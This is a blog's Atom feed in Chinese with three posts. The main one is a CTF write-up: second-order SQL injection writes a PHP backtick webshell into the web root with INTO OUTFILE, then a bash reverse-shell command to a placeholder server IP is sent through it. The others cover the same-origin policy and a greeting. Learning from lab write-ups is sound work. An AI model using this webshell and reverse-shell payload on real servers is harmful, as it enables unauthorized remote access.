<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>木偶&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-11-24T15:52:41.949Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>木偶</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>黑白盒</title>
    <link href="http://yoursite.com/2018/11/24/%E9%BB%91%E7%99%BD%E7%9B%92/"/>
    <id>http://yoursite.com/2018/11/24/黑白盒/</id>
    <published>2018-11-24T14:40:12.497Z</published>
    <updated>2018-11-24T15:52:41.949Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑白盒复现-补招新题"><a href="#黑白盒复现-补招新题" class="headerlink" title="黑白盒复现(补招新题)"></a>黑白盒复现(补招新题)</h1><p>招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  </p><p>首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。</p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；</p><p>2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</p><p>3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。</p><p>4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br><a id="more"></a><br>在大多数情况下，文件上传漏洞一般都是指“上传的Web脚本被服务器解析从而获取网站shell权限”，也就是webshell，要完成上传漏洞攻击需要满足以下几个条件:</p><p>1、上传的文件能够被Web容器解释执行，所以文件上传后所在的目录需要解析器可以执行目录下的文件，也就是说文件目录必须在web容器覆盖路径内才行。</p><p>2、用户可以直接通过浏览器进行访问这个shell文件，如果web容器不能解析这个文件，那么也不能算是漏洞。</p><p>3、最后，上传的shell文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。<br>(来源：看雪)</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>在图片上传上我们看到上传图片的地址已知，访问地址可以看到我们上传上去的图片，所以我们可以利用SQL写入一句话getshell，再反弹shell从服务器中拿到flag。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>网站对我们输入的一些关键字符进行了转义，但在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了该数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。  </p><p>在注册用户名时我们发现当我们的用户名为 1’ 时 登陆后显示的是 1\’ 所以网页对’进行了转义，但当我们在查看用户信息时我们的user_name<br>显示为 1’ 所以说明我们的用户名已经被存储在数据库之中，并且从数据库中提取出来不会存在转义，这就造成了一个二次注入。</p><h4 id="Into-outfile"><a href="#Into-outfile" class="headerlink" title="Into outfile"></a>Into outfile</h4><p>导出数据到pc的指定目录下。<br>在一开始的图片文件上传的时候我们看到存在/var/www/html/favicon/xxx可以读取和查看文件，所以我们将一句话写入这个地方<br>/var/www/html/一般为网站的根目录</p><h4 id="注册-lt-php-GET-x-gt"><a href="#注册-lt-php-GET-x-gt" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;</h4><p>&lt;?php <code>$_GET[x]</code>;?&gt; PHP中反引号 <code></code> 的作用是把反引号中的内容当做Shell命令执行，我们可以在新创建的的网页上传入变量x值来执行我们想要目标主机执行的命令，注册该用户可以将&lt;?php <code>$_GET[x]</code>;?&gt;写入数据库</p><h4 id="注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php"><a href="#注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;’into outfile’/var/www/html/favicon/4.php</h4><p>将&lt;?php <code>$_GET[x]</code>;?&gt;从数据库中提取出来并导出到favicon/4.php<br>此时在4.php中我们就可以通过变量x来上传我们想让目标主机执行的shell命令了</p><h4 id="bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”"><a href="#bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”" class="headerlink" title="bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”"></a>bash -c “bash -i &gt;&amp; /dev/tcp/<your-server-ip>/9999 0&lt;&amp;1 2&gt;&amp;1”</your-server-ip></h4><p>首先，bash -c 就是运行shell脚本 bash -i是打开一个交互的bash，/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。<br>要想了解“&gt;&amp;”、“0&gt;&amp;1”和2&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。</p><p>linux shell下常用的文件描述符是：</p><ol><li><p>标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p></li><li><p>标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p></li></ol><p>&amp;可以理解为c语言中的取地址符（n&lt;&amp;word 是把word复制给n，n&gt;&amp;word是把word复制给n。）2&gt;&amp;1是将标准错误输出合并到标准输出中，&amp;&gt;是将标准错误输出定向到标准输出中。也就是输出标准输出的同时也会输出标准错误输出。这句话的意思创建一个可交互的bash和一个到xxx.xxx.xxx.xxx的TCP链接，然后将bash的输入输出错误都重定向到在xxx.xxx.xxx.xxx监听的进程。简单来说就是A主机可以通过执行B主机上的命令并且把返回值都返回到A上。</p><h5 id="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…"><a href="#这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…" class="headerlink" title="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)"></a>这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)</h5><p>之后再服务器开启监听 nc -lvnp 9999  </p><p>现在我们之前所传的一句话就派上了用场，在4.php的地址后构造?x=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp/<your-server-ip>/9999 0%3C%26%202%3E%261%22 就可以让目标主机执行这个命令  </your-server-ip></p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>A主机开启9999端口的tcp服务<br>B主机连接到A主机的9999的tcp服务<br>A主机通过tcp服务把命令发到B主机<br>B主机读取命令并且在bash中执行<br>B主机把执行结果发给A主机</p><p>拿到shell之后就可以 cd / 进入主目录，主目录中存在包含flag的文件<br><img src="/2018/11/24/黑白盒/1.png" alt=""></p><p>cat读取文件就可以拿到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;黑白盒复现-补招新题&quot;&gt;&lt;a href=&quot;#黑白盒复现-补招新题&quot; class=&quot;headerlink&quot; title=&quot;黑白盒复现(补招新题)&quot;&gt;&lt;/a&gt;黑白盒复现(补招新题)&lt;/h1&gt;&lt;p&gt;招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  &lt;/p&gt;
&lt;p&gt;首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。&lt;/p&gt;
&lt;h3 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h3&gt;&lt;h4 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h4&gt;&lt;p&gt;1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；&lt;/p&gt;
&lt;p&gt;2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);&lt;/p&gt;
&lt;p&gt;3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。&lt;/p&gt;
&lt;p&gt;4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web复现" scheme="http://yoursite.com/categories/Web%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>同源策略</title>
    <link href="http://yoursite.com/2018/11/19/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <id>http://yoursite.com/2018/11/19/同源策略/</id>
    <published>2018-11-19T09:16:54.661Z</published>
    <updated>2018-11-19T09:56:32.033Z</updated>
    
    <content type="html"><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略</p><h2 id="首先是源的概念："><a href="#首先是源的概念：" class="headerlink" title="首先是源的概念："></a>首先是源的概念：</h2><p>•    源（origin）就是协议、域名和端口号。 以下是相对于 <a href="http://www.a.com/test/index.html" target="_blank" rel="noopener">http://www.a.com/test/index.html</a> 的同源检测<br>•    <a href="http://www.a.com/dir/page.html" target="_blank" rel="noopener">http://www.a.com/dir/page.html</a> —-成功<br>•    <a href="http://www.child.a.com/test/index.html" target="_blank" rel="noopener">http://www.child.a.com/test/index.html</a> —-失败，域名不同<br>•    <a href="https://www.a.com/test/index.html" target="_blank" rel="noopener">https://www.a.com/test/index.html</a> —-失败，协议不同<br>所以所谓同源就是协议、域名和端口号均相同。</p><h2 id="什么是同源策略："><a href="#什么是同源策略：" class="headerlink" title="什么是同源策略："></a>什么是同源策略：</h2><a id="more"></a><p>同源策略是一种约定，限制了来自不同源的“document”或脚本，对当前“doucument”的读取或者设置某些属性。</p><h6 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a>举个例子：</h6><p>如果没有同源策略，可能a.com里的一段JS脚本在b.com未加载此脚本时也可以修改b.com的内容。 同源策略限制了不同源的对象之间的互相干扰，也就是说当JS被浏览器认为来自不同源时，请求被拒绝。注意，对于当前页面来说，页面里存放JS文件的域不重要，重要的是加载JS界面的域是什么。</p><h2 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h2><p>浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域</p><h6 id="不受同源策略限制的："><a href="#不受同源策略限制的：" class="headerlink" title="不受同源策略限制的："></a>不受同源策略限制的：</h6><p>1、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。<br> 2、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的 &lt; script src=”…” &gt; &lt; /script &gt;，&lt; img &gt;，&lt; link &gt;，&lt; iframe &gt;等。 所以我们就可以利用&lt; script &gt;标签来绕过了同源策略，来找到跨域漏洞。</p><p>第一次写博客，内容不是很全，也会有许多错误的地方，了解的知识很有限，一些名词和漏洞名称从来没有接触过，希望大家可以指出错误。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h1&gt;&lt;p&gt;最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略&lt;/p&gt;
&lt;h2 id=&quot;首先是源的概念：&quot;&gt;&lt;a href=&quot;#首先是源的概念：&quot; class=&quot;headerlink&quot; title=&quot;首先是源的概念：&quot;&gt;&lt;/a&gt;首先是源的概念：&lt;/h2&gt;&lt;p&gt;•    源（origin）就是协议、域名和端口号。 以下是相对于 &lt;a href=&quot;http://www.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.a.com/test/index.html&lt;/a&gt; 的同源检测&lt;br&gt;•    &lt;a href=&quot;http://www.a.com/dir/page.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.a.com/dir/page.html&lt;/a&gt; —-成功&lt;br&gt;•    &lt;a href=&quot;http://www.child.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.child.a.com/test/index.html&lt;/a&gt; —-失败，域名不同&lt;br&gt;•    &lt;a href=&quot;https://www.a.com/test/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.a.com/test/index.html&lt;/a&gt; —-失败，协议不同&lt;br&gt;所以所谓同源就是协议、域名和端口号均相同。&lt;/p&gt;
&lt;h2 id=&quot;什么是同源策略：&quot;&gt;&lt;a href=&quot;#什么是同源策略：&quot; class=&quot;headerlink&quot; title=&quot;什么是同源策略：&quot;&gt;&lt;/a&gt;什么是同源策略：&lt;/h2&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>博客初建</title>
    <link href="http://yoursite.com/2018/11/17/hello-world/"/>
    <id>http://yoursite.com/2018/11/17/hello-world/</id>
    <published>2018-11-17T09:07:52.974Z</published>
    <updated>2018-11-17T13:39:28.936Z</updated>
    
    <content type="html"><![CDATA[<p><center>从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。<center></center></center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;center&gt;从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。&lt;center&gt;&lt;/center&gt;&lt;/center&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
</feed>
